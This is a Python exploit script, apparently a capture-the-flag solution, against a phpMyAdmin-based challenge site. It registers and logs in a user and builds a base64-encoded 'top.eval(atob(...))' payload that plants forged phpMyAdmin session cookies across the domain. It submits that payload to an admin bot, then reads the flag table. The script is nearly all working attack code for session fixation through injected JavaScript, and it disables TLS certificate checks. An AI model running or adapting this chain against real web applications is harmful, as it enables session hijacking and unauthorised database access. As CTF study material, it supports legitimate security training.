#!/usr/bin/env python3

import requests
import logging
import base64
import os
import urllib3
import time

urllib3.disable_warnings()
logging.disable()

CHECKER_TOKEN = "redacted"


class PhpMyAdmin:
    def __init__(self, url, domain=None):
        self.url = url
        self.s = requests.Session()
        self.s.verify = False

        self.bot_session = requests.Session()
        self.bot_session.verify = False

        self.create_user_session = requests.Session()
        self.create_user_session.verify = False

        self.domain = domain or '.'.join(url.replace("https://", "").replace("/", "").split('.')[1:])

    def _(self, path):
        return self.url + path

    def _login(self, username):
        username = username + "miao"
        res = self.create_user_session.post(
            self._("/public/create-user.php"),
            data={
                'pow': CHECKER_TOKEN,
                'username': username
            }
        )

        password = res.text.replace("User created with password: ", "").replace("\n\n", "")

        login_page = self.s.get(self._("/public/index.php?route=/"))
        set_session = login_page.text.split('<input type="hidden" name="set_session" value="')[1].split('">')[0]
        token = login_page.text.split('<input type="hidden" name="token" value="')[1].split('">')[0]

        data = f"token={token}&set_session={set_session}&pma_username={username}&pma_password={password}&server=1"
        self.s.post(self._("/public/index.php?route=/"), data=data, headers={
            'Content-Type': 'application/x-www-form-urlencoded'
        }, cookies={
            '__Secure-phpMyAdmin_https': set_session
        })

        print("[*] Login with", username, password)

        return username, password, self.s.cookies.get_dict()

    def _get_username_bot(self):
        res = self.bot_session.post(self._('/public/bot.php'), data={
            'pow': CHECKER_TOKEN
        })
        return res.text.replace("Url is not set", "")

    def launch_bot(self, console_url):
        admin_db = self._get_username_bot()
        print("[*] Admin username", admin_db)
        username, _, cookies = self._login(admin_db)
        phpmyadmin = cookies.get('__Secure-phpMyAdmin_https')
        pmaAuth = cookies.get('__Secure-pmaAuth-1_https')
        pmaUser = cookies.get('__Secure-pmaUser-1_https')

        print("[*] Login cookies", cookies)

        cookie = f"document.cookie='_[Secure-phpMyAdmin_https={phpmyadmin};path=/public/index.php;domain=.{self.domain}';" + \
                 f"document.cookie='_[Secure-pmaAuth-1_https={pmaAuth};path=/public/index.php;domain=.{self.domain}';" + \
                 f"document.cookie='_[Secure-pmaUser-1_https={pmaUser};path=/public/index.php;domain=.{self.domain}';"
        payload = f"top.eval(atob('{base64.b64encode(cookie.encode()).decode()}'))"

        url = f"http://{console_url}/?{payload}"

        _ = self.bot_session.post(self._('/public/bot.php'), data={
            'pow': CHECKER_TOKEN,
            'url': url
        })
        print("[*] Bot started... sleeping")

        time.sleep(120)

        resp = self.s.get(self._(f"/public/index.php?route=/sql&pos=0&db={username}&table=flag"),
                          cookies=cookies).text
        flag = resp.split("ECSC{")[1].split("}")[0]
        print("[*] Flag", "ECSC{%s}" % flag)


c = PhpMyAdmin('https://db.phpmysecureadmin.xyz')
c.launch_bot('console.phpmysecureadmin.xyz')
